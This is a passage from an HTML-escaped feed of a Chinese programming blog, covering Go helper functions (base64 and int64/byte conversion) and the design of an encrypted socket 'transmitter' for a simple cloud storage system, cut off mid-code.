class=&quot;string&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; coder = base64.NewEncoding(base64Table)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; Base64Encode(plaintext []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;) []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(coder.EncodeToString(plaintext))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; Base64Decode(ciphertext []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;) ([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; coder.DecodeString(&lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(ciphertext))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;int64-和字节流的转换&quot;&gt;&lt;a href=&quot;#int64-和字节流的转换&quot; class=&quot;headerlink&quot; title=&quot;int64 和字节流的转换&quot;&gt;&lt;/a&gt;int64 和字节流的转换&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;encoding&lt;/code&gt; 包中的 binary 模块可以提供将 uint64 转化为字节流的方法，我们将其包装为两个函数 &lt;code&gt;Int64ToBytes(int64)[]byte&lt;/code&gt; 和 &lt;code&gt;BytesToInt64([]byte)int64&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// authenticate.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;encoding/binary&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; Int64ToBytes(i &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;) []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; buf = &lt;span class=&quot;built_in&quot;&gt;make&lt;/span&gt;([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	binary.BigEndian.PutUint64(buf, &lt;span class=&quot;typename&quot;&gt;uint64&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; buf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; BytesToInt64(buf []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(binary.BigEndian.Uint64(buf[:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;p&gt;专栏目录：&lt;a href=&quot;http://blog.forec.cn/columns/cloud-storage.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云存储系统从入门到放弃&lt;/a&gt;&lt;br&gt;此专栏的上一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/14/cloud-storage-system-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统传输协议实现和封装&lt;/a&gt;&lt;br&gt;此专栏的下一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/16/cloud-storage-system-4/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统传输、认证单元测试&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/15/cloud-storage-system-3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/15/cloud-storage-system-3/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/15/cloud-storage-system-3/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;使用 Golang 实现&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot;&gt;此前&lt;/a&gt;设计的云存储系统传输、认证协议所需的基础模块。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="Golang" scheme="http://forec.github.io/tags/Golang/"/>
    
      <category term="云存储" scheme="http://forec.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
      <category term="线程" scheme="http://forec.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>简易云存储系统传输协议实现和封装</title>
    <link href="http://forec.github.io/2016/11/14/cloud-storage-system-2/"/>
    <id>http://forec.github.io/2016/11/14/cloud-storage-system-2/</id>
    <published>2016-11-13T16:04:34.000Z</published>
    <updated>2016-11-19T14:36:05.787Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;使用 Golang 实现&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇文章&lt;/a&gt;设计的云存储系统文件传输协议。将实现代码封装，提供外部访问接口。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;设计-transmitter&quot;&gt;&lt;a href=&quot;#设计-transmitter&quot; class=&quot;headerlink&quot; title=&quot;设计 transmitter&quot;&gt;&lt;/a&gt;设计 transmitter&lt;/h1&gt;&lt;p&gt;socket 无法维持协议格式，因此需要提供一个 transmitter 类（尽管 Golang 没有提供 OOP 显式表达，但以下将使用 “&lt;strong&gt;类&lt;/strong&gt;” 称呼 &lt;code&gt;strcut&lt;/code&gt;，使用 “&lt;strong&gt;接口&lt;/strong&gt;” 称呼 &lt;code&gt;interface&lt;/code&gt;，使用 “&lt;strong&gt;对象&lt;/strong&gt;” 称呼 &lt;code&gt;struct&lt;/code&gt; 的一个具体实例），该类将 socket 连接包装起来，并向用户提供符合协议要求的接口。此外，下面将使用 “&lt;strong&gt;消息&lt;/strong&gt;” 表示一组符合协议格式的数据流，即满足此前定义的协议格式的一个数据包。&lt;/p&gt;
&lt;h2 id=&quot;类的私有变量&quot;&gt;&lt;a href=&quot;#类的私有变量&quot; class=&quot;headerlink&quot; title=&quot;类的私有变量&quot;&gt;&lt;/a&gt;类的私有变量&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;conn net.Conn&lt;/code&gt;: transmitter 的内部实现应当基于 socket 通信，因此内部需要一个 &lt;code&gt;net.Conn&lt;/code&gt; 对象。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;buf []byte&lt;/code&gt;: socket 通信需要一个缓冲区，因为 socket 本身无法维持应用层的消息边界，所以每次从缓冲区读取的数据长度可能超过一个消息的长度，超出部分的数据实际为下个消息的首部。为了保证数据不被丢失，超过一组消息长度的数据应当被保存在缓冲区中，并和下次读取的数据组成一个新的消息。一个 &lt;code&gt;net.Conn&lt;/code&gt; 对象应当使用同一个缓冲区，以保证数据不被遗漏。因此 transmitter 类中应当维护 &lt;code&gt;net.Conn&lt;/code&gt; 使用的缓冲区。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;buflen int64&lt;/code&gt;: transmitter 中维护的缓冲区大小，单位为字节。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;block cipher.Block&lt;/code&gt;: transmitter 应当保证传输数据的安全性，&lt;code&gt;block&lt;/code&gt; 是 transmitter 使用的加密模块，将在后面加密部分的文章中介绍。下面假定已有函数 &lt;code&gt;AesEncode(plain []byte, block  cipher.Block) []byte&lt;/code&gt; 和 &lt;code&gt;AesDecode(encipher []byte, length int64, block cipher.Block)([]byte, err)&lt;/code&gt;，这两个函数的功能分别是使用 &lt;code&gt;block&lt;/code&gt; 对 &lt;code&gt;plain&lt;/code&gt; 字节流加密，以及使用 &lt;code&gt;block&lt;/code&gt; 对 &lt;code&gt;encipher&lt;/code&gt; 密文解密。前者会返回加密后的字节流，后者会返回解密后的明文，如果解密失败则返回值携带 error。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;recvLen int64&lt;/code&gt;: 缓冲区中已存储的数据长度，即从 socket 读取的，但超过一个消息长度、尚未被使用的数据长度。每次将 socket 接收到的消息读取到缓冲区后，应当将超过一个消息长度的数据移动至缓冲区最开始的位置，这部分数据长度即为 &lt;code&gt;recvLen&lt;/code&gt;，下次 socket 的 read 操作将向缓冲区 &lt;code&gt;buf[recvLen:]&lt;/code&gt; 写入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;接口需求分析&quot;&gt;&lt;a href=&quot;#接口需求分析&quot; class=&quot;headerlink&quot; title=&quot;接口需求分析&quot;&gt;&lt;/a&gt;接口需求分析&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;基本的内部数据获取和设置&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GetConn() net.Conn&lt;/code&gt;：获取该 transmitter 内部的 socket 连接。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GetBuf() []byte&lt;/code&gt;: 获取该 transmitter 内部的缓冲区。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GetBuflen() int64&lt;/code&gt;: 获取该 transmitter 的缓冲区长度。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GetBlock() cipher.Block&lt;/code&gt;: 获取该 transmitter 的加密模块。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SetBuflen(int64) bool&lt;/code&gt;: 为该 transmitter 设置缓冲区大小，并自动拓展/缩小原有的缓冲区。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;析构函数：当 transmitter 寿命终止时，应当调用析构函数 &lt;code&gt;Destroy()&lt;/code&gt; 销毁内部的数据并断开 socket 连接。&lt;/li&gt;
&lt;li&gt;数据传输接口：transmitter 应当提供一些易使用的公有方法，这些方法可以让用户方便的发送/接收字节流，或者从特定的 Reader 发送字节流，并接收字节流至特定的 Writer。我们在&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《认证、传输协议设计》&lt;/a&gt;中假设过已存在一个 &lt;code&gt;RecvBytes()&lt;/code&gt; 函数，该函数能够从 socket 缓冲区读取一组消息。除了要实现该函数，还应当实现对称的 &lt;code&gt;SendBytes(message []byte)&lt;/code&gt; 函数，用于向 socket 发送一组消息。同样，应当设计函数 &lt;code&gt;SendFromReader(reader)&lt;/code&gt; 和 &lt;code&gt;RecvToWriter(writer)&lt;/code&gt; ，它们提供了数据源/目的地是 reader/writer 的操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;具体定义接口&quot;&gt;&lt;a href=&quot;#具体定义接口&quot; class=&quot;headerlink&quot; title=&quot;具体定义接口&quot;&gt;&lt;/a&gt;具体定义接口&lt;/h2&gt;&lt;p&gt;在工程目录下新建文件夹 &lt;code&gt;transmit&lt;/code&gt; ，在该目录下新建代码文件 &lt;code&gt;transmit.go&lt;/code&gt;，将私有类 transmitter 的公有接口定义为 Transmitable，其 Golang 代码表示如下。其中，&lt;code&gt;SendFromReader&lt;/code&gt; 和 &lt;code&gt;RecvToWriter&lt;/code&gt; 选择的 Reader/Writer 是 &lt;code&gt;bufio&lt;/code&gt; 包中的读写器，因为在传输长数据流中将使用 &lt;code&gt;bufio.Reader&lt;/code&gt; 和 &lt;code&gt;bufio.Writer&lt;/code&gt; 去读/写文件。&lt;code&gt;SendFromReader&lt;/code&gt; 的第二个参数是要发送的长度，如果这个参数大于 &lt;code&gt;Reader&lt;/code&gt; 所能读取的长度，则读取到 &lt;code&gt;Reader&lt;/code&gt; 末尾结束，否则读取到参数长度即结束。&lt;br&gt;&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;type&lt;/span&gt; Transmitable &lt;span class=&quot;keyword&quot;&gt;interface&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	SendFromReader(*bufio.Reader, &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	SendBytes([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	RecvToWriter(*bufio.Writer) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	RecvBytes() ([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, error)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Destroy()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	SetBuflen(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	GetConn() net.Conn&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	GetBuf() []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	GetBuflen() &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	GetBlock() cipher.Block&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&quot;实现-transmitter&quot;&gt;&lt;a href=&quot;#实现-transmitter&quot; class=&quot;headerlink&quot; title=&quot;实现 transmitter&quot;&gt;&lt;/a&gt;实现 transmitter&lt;/h1&gt;&lt;h2 id=&quot;SendBytes-和-RecvBytes&quot;&gt;&lt;a href=&quot;#SendBytes-和-RecvBytes&quot; class=&quot;headerlink&quot; title=&quot;SendBytes() 和 RecvBytes()&quot;&gt;&lt;/a&gt;SendBytes() 和 RecvBytes()&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SendBytes([]byte) bool&lt;/code&gt; 的发送过程如下：首先发送一个 8 字节、大端序的明文表明即将发送的总长度，之后按照&lt;a href=&quot;http://blog.forec.cn/2016/11/13/cloud-storage-system-1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《认证、传输协议设计》&lt;/a&gt;设计的数据协议格式 &lt;strong&gt;格式1&lt;/strong&gt; 发送消息，因为每个消息内包含的数据长度受缓冲区限制，因此可能需要传送多个消息才能发送所有数据。代码如下，其中第 6 行发送待发送数据明文的总长度，用到的 &lt;code&gt;auth.Int64Bytes(int64) []byte&lt;/code&gt; 可以将一个 &lt;code&gt;int64&lt;/code&gt; 数据转化为 8 字节、大端序的字节数组，与之对称的 &lt;code&gt;BytesToInt64([]byte) int64&lt;/code&gt; 可以将参数的前 8 个字节转化为一个 int64 类型，这两个函数将在后面要实现的 &lt;code&gt;authenticate&lt;/code&gt; 包中介绍，现在假设已经拥有这两个函数。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; (t *transmitter) SendBytes(toSend []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; t.buf == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || t.conn == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	totalLength := &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(toSend)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	_, err := t.conn.Write(auth.Int64ToBytes(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(totalLength)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	chRate := time.Tick(&lt;span class=&quot;number&quot;&gt;2e3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	alSend := &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; length &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;lt;-chRate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; totalLength == alSend &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; totalLength-alSend &amp;lt; &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;(t.buflen/&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			length = totalLength - alSend&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			length = &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;(t.buflen / &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:], toSend[alSend:alSend+length])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf, auth.Int64ToBytes(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(length)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		encoded := auth.AesEncode(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:length+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;], t.block)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:], auth.Int64ToBytes(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(encoded)+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:], encoded)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		_, err = t.conn.Write(t.buf[:&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(encoded)+&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span 